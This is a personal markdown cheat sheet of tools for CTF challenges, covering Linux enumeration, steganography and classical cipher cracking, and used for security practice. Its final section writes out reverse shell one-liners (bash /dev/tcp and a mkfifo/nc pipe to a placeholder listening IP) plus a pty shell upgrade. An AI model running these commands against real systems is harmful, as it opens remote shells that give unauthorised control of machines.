# Tools and resources I have used on CTF's and Challenges

## Enumerating
### Linux
* LinEnum: https://github.com/rebootuser/LinEnum
* linprivesc: 

## Steganography
### MP3
* Spectrum analyzer: https://academo.org/demos/spectrum-analyzer/

### Images
* ImageStegano Tool: https://github.com/varunon9/Image-Stegano
  * check bit planes
* steghide

## Crypto
### Cipher cracking
* Vigenère
  * https://f00l.de/hacking/vigenere.php
  * http://simonsingh.net/The_Black_Chamber/vigenere_cracking_tool.html
* Caesar
  * https://www.nayuki.io/page/automatic-caesar-cipher-breaker-javascript
  
## Reverse shell
### 1 - S: bash ; C: nc
* Server: bash -i >& /dev/tcp/LISTENING-IP/LISTENING-PORT 0>&1
* Client: nc -nlvp LISTENING-PORT

### 2 - S: nc ; C: nc
* Server: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LISTENING-IP LISTENING-PORT >/tmp/f
* Client: nc -nlvp LISTENING-PORT

## Decent shell:
```
$ echo "import pty; pty.spawn('/bin/bash')" > /tmp/shell.py
$ python shell.py
```
